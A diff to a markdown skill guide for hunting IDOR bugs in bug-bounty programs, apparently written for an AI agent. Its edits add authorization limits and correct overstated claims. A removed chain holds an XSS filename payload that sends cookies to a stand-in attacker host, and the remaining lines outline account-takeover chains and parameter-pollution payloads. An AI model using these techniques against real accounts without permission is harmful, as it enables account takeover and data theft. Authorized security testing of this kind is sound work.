@@ -74,7 +74,7 @@ report_count: 39
 
 **Response header signals:**
 - `Content-Type: application/json` on endpoints accepting raw IDs
-- No `X-Frame-Options` or CORS misconfigs paired with ID params
+- Missing frame/CORS headers do not establish object-level authorization failure
 - `Authorization: Bearer` tokens that are user-scoped but hit org-level resources
 
 **JavaScript source patterns:**
@@ -89,7 +89,7 @@ state.currentUser.organizationId
 
 **Tech stack signals:**
 - GraphQL endpoints (query-based IDORs are often missed)
-- REST APIs with sequential integer IDs (most vulnerable)
+- REST APIs with sequential integer IDs (discoverability is not authorization)
 - UUIDs that are predictable or leaked in other responses
 - Multi-tenant SaaS apps with `org_id`, `account_id`, `business_id` params
 - Mobile apps (Burp the APK — mobile APIs often skip authorization checks)
@@ -290,7 +290,7 @@ done
 - Technique: Use your own token to access another user's resource ID
 
 **Defense: Rate limiting on enumeration**
-- Bypass: Slow enumeration (1 req/5s), use distributed IPs, or exploit non-enumeration IDORs (you already know the target's ID from another leak)
+- Bypass: Slow enumeration (1 req/5s), do not bypass agreed rate limits; use non-enumeration IDORs (you already know the target's ID from another leak)
 
 **Defense: Checking `user_id` in WHERE clause**
 - Bypass: Check if the same endpoint exists at a different API version (`/v1/` vs `/v2/`) — authorization logic is often version-specific
@@ -323,7 +323,7 @@ Before writing the report, answer all three:
    - 200 OK response showing victim's data (or confirmed state change) ✓
    - No reliance on pre-existing state or timing ✓
    
-   If you can't demo it reproducibly, do not file the report.
+   If safe reproduction is incomplete, report the bounded observation and missing prerequisites through the program-approved path; do not expand to real victim data to satisfy this gate.
 
 ---
 
@@ -349,16 +349,12 @@ Standalone IDOR gets paid at Low-Medium for cross-tenant *read*. The real money 
 - **A.** Confirm IDOR on the email-change endpoint — request `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session; server changes the victim's email without ownership check.
 - **B.** Hit the password-reset flow on the victim's account — server emails reset link to the **new** email (attacker's).
 - **C.** Open reset link, set new password, log in as victim.
-- **Impact:** Silent ATO — victim sees no email change notification because the change happens via API not via the user-facing "change email" UI which has its own audit log.
+- **Impact:** Potential ATO only if the controlled email change, recovery and session prerequisites are demonstrated; notification/audit behavior must be observed, not inferred from API usage.
 - **Real shape:** Classic ATO pattern across many SaaS bug-bounty disclosures 2018-2024. Cross-refs `hunt-ato` Path 2 (email change without re-auth).
 
-### Chain 2 — IDOR on File-Download + Filename-Controlled `Content-Disposition` → Reflected-XSS-Via-Download → Session Theft
+### Chain 2 — IDOR plus a separately demonstrated content-handling flaw
 
-- **A.** IDOR on `/api/files/{id}/download` returns any user's file given the ID.
-- **B.** The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file with filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
-- **C.** Victim navigates to download → browser interprets the injected script in the response header context as HTML → JS runs same-origin → cookie/token exfil.
-- **Impact:** ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.
-- **Real shape:** Multiple disclosed cases involving Office 365 SharePoint download endpoints, GitLab attachment downloads, SaaS export endpoints. Pairs with `hunt-xss` Chain 1 (response-header XSS class).
+Content-Disposition filename text is not interpreted as HTML merely because it contains a script tag. A separate proven header-splitting, response-body/content-type or same-origin rendering weakness would be required. Use inert canary filenames and controlled accounts; do not infer session theft, cookie readability or takeover from filename reflection. The former SharePoint/GitLab attributions did not substantiate the asserted generic browser mechanism and are not evidence of it.
 
 ### Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay Relation Traversal → Cross-Tenant Mass Data Extraction
 
@@ -409,7 +405,7 @@ Cross-references:
 
 - **`hunt-auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
 - **`hunt-ato`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
-- **`hunt-graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
+- **`hunt-graphql`** — GraphQL resolvers require effective object/field authorization, which may be enforced in shared business logic; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
 - **`security-arsenal`** — Pull the IDOR Bypass Tables section for HTTP-parameter-pollution payloads (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when the first direct substitution returns 403.
 - **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't actually leak data (empty array, redacted fields, "access denied" in body with 200 status). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.
 
@@ -432,3 +428,9 @@ cat scope.txt  # target list from the authorized engagement brief
 ```
 
 > Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
+
+## Controlled evidence and claim limits
+
+Test only two expressly permitted accounts/tenants and owner-created canary objects. Sequential range/ffuf/method-loop examples are not permission to enumerate unknown users, delete data or cause financial transactions; use a bounded allowlist of controlled IDs and approved verbs. Stop on unexpected third-party data and retain minimal redacted proof. A 200 response or identifier/JSON/header pattern alone is no finding; demonstrate the specific unauthorized effect against known access policy.
+
+Historical report counts, payout rankings, brands and chain attributions are not independently verified here. Read-IDOR severity can be high without a state-change chain, and no chain guarantees full database access, a legal breach or extortion impact. Base64 is encoding, not a cryptographic hash; UUID opacity is defense in depth, never authorization. Missing helper references provide no runtime capability. No account access, probing, extraction or transaction occurred during review.
